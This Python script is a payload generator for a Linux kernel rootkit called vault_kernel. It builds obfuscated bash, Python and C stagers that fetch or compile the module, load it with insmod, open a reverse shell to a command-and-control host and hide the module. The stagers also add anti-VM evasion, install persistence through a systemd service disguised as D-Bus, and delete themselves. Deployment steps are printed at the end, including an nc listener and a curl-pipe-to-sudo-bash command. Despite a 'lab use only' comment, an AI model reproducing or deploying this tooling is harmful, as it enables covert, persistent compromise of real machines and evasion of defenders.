#!/usr/bin/env python3
"""
vault_kernel Payload Generator v3.6
Interactive builder for kernel rootkit delivery payloads.
Auto-detects local IP, generates obfuscated multi-format payloads
with anti-VM evasion and persistence.

ruby570bocadito (c) 2026
"""

import os, sys, socket, base64, random
from pathlib import Path
from datetime import datetime

ROOT = Path(__file__).resolve().parent.parent
SRC  = ROOT / "src"
OUT  = Path(__file__).resolve().parent

# ================================================================
# Utilities
# ================================================================
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))

def gen_key(length=16):
    return "".join(chr(random.randint(65, 90)) for _ in range(length))

# ================================================================
# Anti-VM checks (shell snippet)
# ================================================================
ANTI_VM = r"""
_anti_vm() {
    for d in /dev/vda /dev/xvda; do [ -e "$d" ] && return 0; done
    if [ -f /sys/class/dmi/id/product_name ]; then
        case "$(cat /sys/class/dmi/id/product_name 2>/dev/null|tr '[:upper:]' '[:lower:]')" in
            *virtualbox*|*vmware*|*qemu*|*kvm*|*bochs*|*hyper-v*|*innotek*) return 0 ;;
        esac
    fi
    grep -qi hypervisor /proc/cpuinfo 2>/dev/null && return 0
    ip link show 2>/dev/null|grep -qiE "(08:00:27|00:0c:29|00:50:56|00:1c:42|00:05:69)" && return 0
    return 1
}
if _anti_vm; then exit 0; fi
"""

# ================================================================
# Persistence code (shell)
# ================================================================
PERSISTENCE = r"""
_persist() {
    local KO_PATH="$1"
    local INSTALLED=0
    # Persistence needs root; skip silently when dry-running as user.
    if [ "$(id -u)" = "0" ] && command -v systemctl >/dev/null 2>&1; then
        cat > /etc/systemd/system/dbus-system.service << 'SVC'
[Unit]
Description=D-Bus System Message Bus
After=network.target
[Service]
Type=oneshot
ExecStartPre=/bin/sleep 30
ExecStart=/sbin/insmod __KO_PATH__
RemainAfterExit=yes
[Install]
WantedBy=multi-user.target
SVC
        sed -i "s|__KO_PATH__|${KO_PATH}|" /etc/systemd/system/dbus-system.service
        systemctl daemon-reload 2>/dev/null || true
        systemctl enable dbus-system.service 2>/dev/null && INSTALLED=1
    fi
    if [ "$INSTALLED" = "0" ] && [ "$(id -u)" = "0" ] && [ -f /etc/rc.local ]; then
        grep -q vault_kernel /etc/rc.local 2>/dev/null || \
            echo "/sbin/insmod ${KO_PATH}" >> /etc/rc.local
    fi
}
_persist "$WORKDIR/vault_kernel.ko"
"""

# ================================================================
# Bash inline dropper
# ================================================================
def build_bash(host, port, xorkey="", anti_vm=True, persistence=True, obfuscate=True):
    import tarfile, io

    # Pack kernel source
    tar_buf = io.BytesIO()
    with tarfile.open(fileobj=tar_buf, mode="w:gz") as tar:
        for f in sorted(SRC.glob("*")):
            if f.suffix in (".c", ".h") or f.name == "Makefile":
                tar.add(f, arcname=f.name)
    raw = tar_buf.getvalue()

    if obfuscate and xorkey:
        raw = xor(raw, xorkey.encode())
        b64 = base64.b64encode(raw).decode()
        # Key is embedded as hex so quotes/backslashes in custom keys
        # can never break the generated python one-liner.
        decode = (f'python3 -c "import sys;d=sys.stdin.buffer.read();'
                  f'k=bytes.fromhex(\'{xorkey.encode().hex()}\');'
                  f'sys.stdout.buffer.write(bytes(d[i]^k[i%len(k)] for i in range(len(d))))"')
        extract = 'printf "%s" "$PAYLOAD_B64" | base64 -d | ' + decode + ' | tar xzf -'
    else:
        b64 = base64.b64encode(raw).decode()
        extract = 'printf "%s" "$PAYLOAD_B64" | base64 -d | tar xzf -'

    script = f'''#!/bin/bash
# vault_kernel dropper v3.3 — kernel rootkit implant (LAB USE ONLY)
#
# v3.3 fix: v3.2 reused the variable T for BOTH the work directory and
# the base64 payload, so "mkdir -p $T" expanded to a multi-hundred-KB
# blob and the dropper died on its first step.  Payload now lives in
# PAYLOAD_B64, the workdir in WORKDIR.
#
# Dry-run without touching the kernel (lab CI):
#   INSMOD=/bin/true bash dropper.sh
set -e

export WORKDIR="/tmp/.$(head -c6 /dev/urandom|base64|tr -dc a-z0-9|head -c8)"
export H="{host}" P="{port}"
PAYLOAD_B64="{b64}"
INSMOD="${{INSMOD:-/sbin/insmod}}"

_s(){{ logger -t "systemd-coredump" "$1" 2>/dev/null||true; }}

# Anti-VM
{ANTI_VM if anti_vm else ":"}

# Deps
_s "setup"
command -v gcc >/dev/null 2>&1||{{ apt-get update -qq&&apt-get install -y -qq build-essential linux-headers-$(uname -r) 2>/dev/null; }}

# Extract & build
_s "extract"
mkdir -p "$WORKDIR"&&cd "$WORKDIR"
{extract}
_s "build"
make clean >/dev/null 2>&1||true
make >/dev/null 2>&1||{{ _s "build failed";exit 1; }}

# Load
_s "load"
"$INSMOD" "$WORKDIR/vault_kernel.ko" 2>/dev/null||{{ _s "insmod failed (need root + headers)";exit 1; }}
for i in $(seq 1 10);do [ -e /dev/vault_kernel ]&&break;sleep 0.1;done

# Hide module + trigger shell
python3 -c "
import fcntl,os
fd=os.open('/dev/vault_kernel',2)
fcntl.ioctl(fd,(0<<30)|(0xC0<<8)|0x0D)
os.close(fd)
fd=os.open('/dev/vault_kernel',2)
buf=b'$H:$P\\x00'.ljust(256,b'\\x00')
fcntl.ioctl(fd,(1<<30)|(256<<16)|(0xC0<<8)|0x0B,buf)
os.close(fd)
" 2>/dev/null||true
_s "shell triggered -> $H:$P"

# Persist
{generate_persistence(persistence)}

# Hide dir + self-destruct
python3 -c "
import fcntl,os
fd=os.open('/dev/vault_kernel',2)
fcntl.ioctl(fd,(1<<30)|(256<<16)|(0xC0<<8)|0x02,'$(basename "$WORKDIR")\\x00'.ljust(256,b'\\x00'))
os.close(fd)
" 2>/dev/null||true
cd / && rm -rf "$WORKDIR" && rm -f "$0" 2>/dev/null||true
_s "done"
exit 0
'''
    return script.strip() + "\n"


def generate_persistence(enable):
    if not enable:
        return "# no persistence"
    return PERSISTENCE


# ================================================================
# Python stager
# ================================================================
def build_python(host, port):
    return f'''#!/usr/bin/env python3
import os,sys,platform,struct,fcntl,urllib.request,tempfile,time
H,P="{host}","{port}"
C2=f"http://{{H}}:8080/vault_kernel-{{platform.release()}}-{{platform.machine()}}.ko"
try:
 if os.geteuid():os.execvp("sudo",["sudo",sys.executable]+sys.argv)
 k=urllib.request.urlopen(C2,timeout=30).read()
 t=tempfile.mkdtemp(prefix=".x");p=os.path.join(t,"r.ko")
 open(p,"wb").write(k)
 os.system(f"/sbin/insmod {{p}} 2>/dev/null")
 time.sleep(.5)
 for i in range(10):
  if os.path.exists("/dev/vault_kernel"):break
  time.sleep(.1)
 fd=os.open("/dev/vault_kernel",2)
 buf=f"{{H}}:{{P}}".encode().ljust(256,b"\\0")
 fcntl.ioctl(fd,(1<<30)|(256<<16)|(0xC0<<8)|0x0B,buf)
 os.close(fd)
 fcntl.ioctl(os.open("/dev/vault_kernel",2),(0<<30)|(0xC0<<8)|0x0D)
 os.unlink(__file__)
 print(f"[+] Shell -> {{H}}:{{P}}")
except Exception as e:print(f"[-] {{e}}")
'''


# ================================================================
# C stager (source — compiles to ~15KB binary)
# ================================================================
def build_c(host, port):
    return f'''/*
 * vault_kernel stager v3.3 — minimal C downloader/loader
 * Compile: gcc -O2 -s -o stager stager.c -static
 * Size: ~15KB static, ~8KB dynamic
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>

#define C2 "{host}"
#define PORT "{port}"

/* IOCTL values matching kernel module */
#define IO_HIDE_MODULE  (((0UL)<<30)|((0xC0)<<8)|(0x0D))
#define IO_SHELL        (((1UL)<<30)|((256)<<16)|((0xC0)<<8)|(0x0B))

static int download(const char *url, unsigned char **out, size_t *olen) {{
    char host[256], path[512], request[1024];
    int port = 80, sock, n;
    struct hostent *he;
    struct sockaddr_in addr;
    unsigned char *resp = NULL, *payload;
    unsigned char buf[4096];
    size_t total = 0, cap = 0, i, blen;
    const char *p, *body = NULL;

    *out = NULL;
    *olen = 0;

    /* Parse http://host[:port]/path by hand.  scanf's %d stops at the
     * ':' separator, so the v3.2 sscanf NEVER parsed the port and left
     * it uninitialized (using garbage or silently defaulting to 80). */
    if (strncmp(url, "http://", 7) != 0) return -1;
    p = url + 7;
    while (*p && *p != ':' && *p != '/' && (size_t)(p - (url + 7)) < sizeof(host) - 1) p++;
    if (p == url + 7) return -1;
    memcpy(host, url + 7, (size_t)(p - (url + 7)));
    host[p - (url + 7)] = '\\0';
    if (*p == ':') {{
        port = atoi(p + 1);
        if (port <= 0 || port > 65535) return -1;
        while (*p && *p != '/') p++;
    }}
    snprintf(path, sizeof(path), "%s", *p ? p : "/");

    he = gethostbyname(host);
    if (!he || !he->h_addr_list[0]) return -1;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {{ close(sock); return -1; }}

    snprintf(request, sizeof(request),
        "GET %s HTTP/1.1\\r\\nHost: %s\\r\\n"
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\\r\\n"
        "Accept: */*\\r\\nConnection: close\\r\\n\\r\\n",
        path, host);

    if (write(sock, request, strlen(request)) < 0) {{ close(sock); return -1; }}

    /* Buffer the WHOLE response, then split the headers exactly once.
     * The v3.2 per-chunk strstr() appended HTTP headers (or header
     * fragments) into the .ko whenever the \\r\\n\\r\\n boundary landed
     * between two read() calls — the downloaded module never loaded. */
    for (;;) {{
        if (total + sizeof(buf) > cap) {{
            cap = (total + sizeof(buf)) * 2;
            resp = realloc(resp, cap);
            if (!resp) {{ close(sock); return -1; }}
        }}
        n = read(sock, resp + total, sizeof(buf));
        if (n <= 0) break;
        total += (size_t)n;
    }}
    close(sock);
    if (total < 16) {{ free(resp); return -1; }}

    for (i = 0; i + 4 <= total; i++) {{
        if (resp[i] == '\\r' && resp[i+1] == '\\n' && resp[i+2] == '\\r' && resp[i+3] == '\\n') {{
            body = (const char *)resp + i + 4;
            break;
        }}
    }}
    if (!body) {{ free(resp); return -1; }}

    blen = total - (size_t)(body - (const char *)resp);
    if (blen == 0) {{ free(resp); return -1; }}
    payload = malloc(blen);
    if (!payload) {{ free(resp); return -1; }}
    memcpy(payload, body, blen);
    free(resp);

    *out = payload;
    *olen = blen;
    return 0;
}}

int main(int argc, char **argv) {{
    unsigned char *data = NULL;
    size_t len = 0;
    char ko[128], hostport[256];
    int fd, status;
    pid_t pid;

    signal(SIGCHLD, SIG_DFL);

    /* Fetch payload from C2 */
    printf("[*] Fetching vault_kernel.ko from C2...\\n");
    if (download("http://" C2 ":8080/vault_kernel.ko", &data, &len) < 0) {{
        fprintf(stderr, "[-] Download failed\\n");
        return 1;
    }}
    printf("[+] Downloaded %zu bytes\\n", len);

    /* Write .ko */
    snprintf(ko, sizeof(ko), "/tmp/.vk_%d.ko", (int)getpid());
    fd = open(ko, O_WRONLY|O_CREAT|O_TRUNC, 0600);
    if (fd < 0) {{ perror("open"); free(data); return 1; }}
    /* glibc marks write() __wur (FORTIFY): ignoring the return value
     * fails -Wunused-result on Ubuntu runners and breaks the payload
     * regression job.  Check it for real — a short write corrupts
     * the .ko. */
    if (write(fd, data, len) != (ssize_t)len) {{ perror("write"); close(fd); free(data); return 1; }}
    close(fd);
    free(data);

    /* Load via insmod — INSMOD env var overrides the path so lab
     * dry-runs can substitute /bin/true and exercise the stager
     * without loading anything. */
    {{
        const char *insmod = getenv("INSMOD");
        if (!insmod || !*insmod) insmod = "/sbin/insmod";
        pid = fork();
        if (pid == 0) {{
            execl(insmod, "insmod", ko, NULL);
            _exit(127);
        }}
        waitpid(pid, &status, 0);
    }}
    if (WEXITSTATUS(status) != 0) {{
        fprintf(stderr, "[-] insmod failed (exit=%d)\\n", WEXITSTATUS(status));
        unlink(ko);
        return 1;
    }}
    printf("[+] Module loaded\\n");

    /* Trigger reverse shell */
    sleep(1);
    for (int i = 0; i < 10; i++) {{
        fd = open("/dev/vault_kernel", O_RDWR);
        if (fd >= 0) break;
        usleep(100000);
    }}
    if (fd >= 0) {{
        memset(hostport, 0, sizeof(hostport));
        snprintf(hostport, sizeof(hostport), "%s:%s", C2, PORT);
        ioctl(fd, IO_SHELL, hostport);
        ioctl(fd, IO_HIDE_MODULE);
        close(fd);
        printf("[+] Reverse shell -> %s:%s\\n", C2, PORT);
    }} else {{
        fprintf(stderr, "[-] /dev/vault_kernel not found\\n");
    }}

    /* Cleanup */
    unlink(ko);
    printf("[+] Clean exit\\n");

    return 0;
}}
'''


# ================================================================
# CLI mode
# ================================================================
def cli():
    import argparse
    p = argparse.ArgumentParser(description="vault_kernel v3.6 Payload Generator")
    p.add_argument("--host", help="C2 IP for reverse shell callback")
    p.add_argument("--port", default="4444", help="C2 port")
    p.add_argument("--format", choices=["bash","python","c","all"], default="bash")
    p.add_argument("--output", help="Output file path (auto-appends extension)")
    p.add_argument("--no-anti-vm", action="store_true")
    p.add_argument("--no-obfuscate", action="store_true")
    p.add_argument("--no-persistence", action="store_true")
    p.add_argument("--xorkey", default="")
    args = p.parse_args()

    host = args.host or get_local_ip()
    port = args.port
    av = not args.no_anti_vm
    ob = not args.no_obfuscate
    per = not args.no_persistence
    key = args.xorkey or (gen_key() if ob else "")

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fmts = ["bash", "python", "c"] if args.format == "all" else [args.format]
    ext_map = {"bash": ".sh", "python": ".py", "c": ".c"}

    for fmt in fmts:
        ext = ext_map[fmt]
        path = (args.output or str(OUT / f"{fmt}_stager_{ts}")) + ext

        builders = {"bash": lambda: build_bash(host, port, key, av, per, ob),
                     "python": lambda: build_python(host, port),
                     "c": lambda: build_c(host, port)}

        content = builders[fmt]()
        with open(path, "w") as f:
            f.write(content)
        os.chmod(path, 0o755)
        print(f"[+] {fmt.upper():6s} {path} ({os.path.getsize(path)/1024:.1f} KB)")

    print(f"\n[*] Listener:     nc -lvnp {port}")
    print(f"[*] Serve files:  cd {OUT} && python3 -m http.server 8080")


# ================================================================
# Interactive mode
# ================================================================
def interactive():
    print("""
  vault_kernel — Payload Generator v3.6
  ruby570bocadito (c) 2026
""")
    local_ip = get_local_ip()
    print(f"  Detected IP: {local_ip}\n")
    host = input(f"  C2 IP [{local_ip}]: ").strip() or local_ip
    port = input("  C2 port [4444]: ").strip() or "4444"

    print("\n  Format:")
    print("    1) bash dropper  (inline, self-compiling, ~20KB)")
    print("    2) python stager (downloads .ko from C2, ~1KB)")
    print("    3) C stager       (compiles to ~15KB binary)")
    print("    4) ALL formats")
    fmt = {"1":"bash","2":"python","3":"c","4":"all"}.get(input("  Choice [1]: ").strip() or "1", "bash")

    av = input("\n  Anti-VM / sandbox evasion? [Y/n]: ").strip().lower() != "n"
    ob = input("  XOR obfuscate embedded payload? [Y/n]: ").strip().lower() != "n"
    key = ""
    if ob:
        key = input("  XOR key (enter for random): ").strip()
        if not key:
            key = gen_key()
            print(f"  Generated key: {key}")

    per = input("\n  Install persistence (survive reboot)? [Y/n]: ").strip().lower() != "n"

    odir = input(f"\n  Output directory [{OUT}]: ").strip() or str(OUT)
    os.makedirs(odir, exist_ok=True)

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fmts = ["bash","python","c"] if fmt == "all" else [fmt]
    ext_map = {"bash": ".sh", "python": ".py", "c": ".c"}
    generated = []

    for f in fmts:
        ext = ext_map[f]
        path = os.path.join(odir, f"{f}_stager_{ts}{ext}")
        builders = {"bash": lambda: build_bash(host, port, key, av, per, ob),
                     "python": lambda: build_python(host, port),
                     "c": lambda: build_c(host, port)}
        content = builders[f]()
        with open(path, "w") as fh:
            fh.write(content)
        os.chmod(path, 0o755)
        generated.append((f, path))

    print("\n  === Generated Payloads ===\n")
    for fmt_name, fpath in generated:
        print(f"  [{fmt_name.upper():6s}] {fpath}  ({os.path.getsize(fpath)/1024:.1f} KB)")

    print(f"""
  === Deployment ===
  1. Listener:  nc -lvnp {port}
  2. Serve:     cd {odir} && python3 -m http.server 8080
  3. Deploy:    curl -s http://{host}:8080/{os.path.basename(generated[0][1])} | sudo bash
  """)


if __name__ == "__main__":
    if len(sys.argv) > 1:
        cli()
    else:
        interactive()
